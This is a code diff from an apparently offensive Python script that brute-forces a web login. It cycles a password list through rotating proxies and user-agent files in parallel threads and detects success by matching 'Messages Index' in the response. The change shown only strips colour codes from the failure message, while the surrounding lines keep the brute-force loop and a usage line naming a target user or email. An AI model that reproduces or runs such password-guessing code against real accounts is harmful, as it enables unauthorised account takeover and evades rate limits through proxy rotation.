@@ -20,6 +20,6 @@ try:
             get=sessions.post(url,data=data,headers=headers,proxies=ip[pl])
             return re.findall("Messages Index",get.text)
 
-    for i in range(len(passlist)):_thread.start_new_thread(print,(passlist[i],sys.exit(passlist[i]+" loggedin") if brute(i) else "\033[91m \033[5m Faild \033[0m"))
+    for i in range(len(passlist)):_thread.start_new_thread(print,(passlist[i],sys.exit(passlist[i]+" loggedin") if brute(i) else " Faild"))
 
 except:print("\033[94m"+sys.argv[0].split("\\")[::-1][0]+" [User Name | Email] [Passwords File] [Proxies File] [User-Agent File] \033[0m")
